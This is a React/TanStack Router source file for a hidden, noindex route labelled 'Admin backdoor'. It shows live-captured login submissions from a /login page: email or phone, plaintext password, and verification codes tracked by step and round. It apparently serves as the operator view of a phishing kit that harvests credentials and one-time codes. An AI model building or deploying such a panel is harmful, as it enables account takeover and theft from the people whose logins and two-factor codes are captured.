import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import {
  readAdminLog,
  subscribeAdminLog,
  clearAdminLog,
  type AdminEntry,
} from "@/lib/nero-flow";

export const Route = createFileRoute("/me12345@")({
  head: () => ({
    meta: [
      { title: "Admin — Nero" },
      { name: "robots", content: "noindex" },
    ],
  }),
  component: AdminPage,
});

function AdminPage() {
  const [entries, setEntries] = useState<AdminEntry[]>([]);

  useEffect(() => {
    const refresh = () => {
      readAdminLog().then(setEntries);
    };
    refresh();
    return subscribeAdminLog(refresh);
  }, []);

  return (
    <div className="min-h-screen bg-background px-4 py-8 text-foreground">
      <div className="mx-auto max-w-3xl">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold">Admin backdoor</h1>
            <p className="text-sm text-muted-foreground">
              Live capture of login form + code submissions (dev only).
            </p>
          </div>
          <button
            onClick={() => {
              clearAdminLog().then(() => readAdminLog().then(setEntries));
            }}
            className="rounded-md border border-input bg-card px-3 py-2 text-sm hover:bg-accent"
          >
            Clear
          </button>
        </div>

        <div className="mt-6 space-y-3">
          {entries.length === 0 && (
            <p className="rounded-md border border-dashed border-input p-6 text-center text-sm text-muted-foreground">
              No submissions yet. Open /login in another tab — entries appear here in realtime.
            </p>
          )}
          {entries.map((e) => (
            <div
              key={e.id}
              className="rounded-md border border-input bg-card p-4 text-sm"
            >
              <div className="flex items-center justify-between text-xs text-muted-foreground">
                <span className="font-mono uppercase">
                  {e.kind === "login" ? "LOGIN" : `CODE ${e.step ?? ""}`} · round {e.round}
                </span>
                <span>{new Date(e.ts).toLocaleTimeString()}</span>
              </div>
              {e.kind === "login" ? (
                <div className="mt-2 space-y-1">
                  <div>
                    <span className="text-muted-foreground">Email/Phone: </span>
                    <span className="font-mono">{e.identifier}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground">Password: </span>
                    <span className="font-mono">{e.password}</span>
                  </div>
                </div>
              ) : (
                <div className="mt-2">
                  <span className="text-muted-foreground">Code: </span>
                  <span className="font-mono text-base tracking-[0.3em]">{e.code}</span>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}